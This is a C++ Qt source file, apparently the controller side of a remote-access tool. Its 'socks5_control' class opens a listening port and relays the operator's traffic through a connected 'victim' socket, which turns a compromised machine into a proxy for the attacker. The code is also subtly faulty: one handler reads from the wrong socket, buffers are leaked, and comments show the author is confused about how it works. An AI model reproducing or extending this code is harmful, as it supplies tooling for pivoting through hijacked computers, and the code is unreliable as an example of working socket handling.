#include "socks5_control.h"
#include <QString>
/* the client here is me when i connect
 *
 *
 *
 *
 */
socks5_control::socks5_control(QWidget *parent, QTcpSocket *tcpSocket) : QWidget(parent)
{
// tcpSocket is the victim..... we should agree on a port to use that is
    // avaiable on the TCP/IP stack.
    tcpServer = new QTcpServer();
    tcpServer->listen(QHostAddress::Any, this->my_socks5_port);
    this->victimConnection = tcpSocket;
    connect(tcpServer, &QTcpServer::newConnection, this, &socks5_control::newConnection);
    connect(tcpSocket ,SIGNAL(readyRead()),this,SLOT(victim_onReadyRead()));
}
// victim has written data to us.
//this is called when the victim calls recv() on its side.
// it then calls send() to send the data it got back to us
void socks5_control::victim_onReadyRead(){
    // senderSocket here is tcpSocket
    QTcpSocket * senderSocket = dynamic_cast<QTcpSocket*>(sender());

    if(!senderSocket)
        return;

    QByteArray *bytes = new QByteArray();
    while(senderSocket->bytesAvailable()){
        // allocates itself lmfao
        bytes->append(victimConnection->readAll());

    }
    // this will translate to recv() back to us?!
    myConnection->write(bytes->data(), bytes->size());

}
// data has been written by me to the TCP server and now we forward this shit
//onReadReady is called when i call send() y?
void socks5_control::my_onReadyRead()
{
    // senderSocket is my socket connection a.k.a myConnection
    QTcpSocket * senderSocket = dynamic_cast<QTcpSocket*>(sender());

    if(!senderSocket)
        return;

    QByteArray *bytes = new QByteArray();
    while(senderSocket->bytesAvailable()){
        // allocates itself lmfao
        bytes->append(victimConnection->readAll());

    }
    // i forward this data to the victim
    victimConnection->write(bytes->data(), bytes->size());

}

void socks5_control::newConnection(){

    // I JUST CONNECTED TO THE FUCKING SERVER
  QTcpSocket *socket = tcpServer->nextPendingConnection();
  if(socket)
  {
      if(!socket)
          return;

      this->myConnection = socket;
      connect(socket, SIGNAL(readyRead()), this, SLOT(my_onReadyRead()));
    //connect(socket ,SIGNAL(disconnected()),socket ,SLOT(deleteLater()));
   }
}
void socks5_control::disconnect_sock(){
    this->victimConnection->close();
    this->myConnection->close();
    this->tcpServer->close();

    // write to log that this client has disconnected.
    // also remove any additional data that needs to be cleanup here...
}
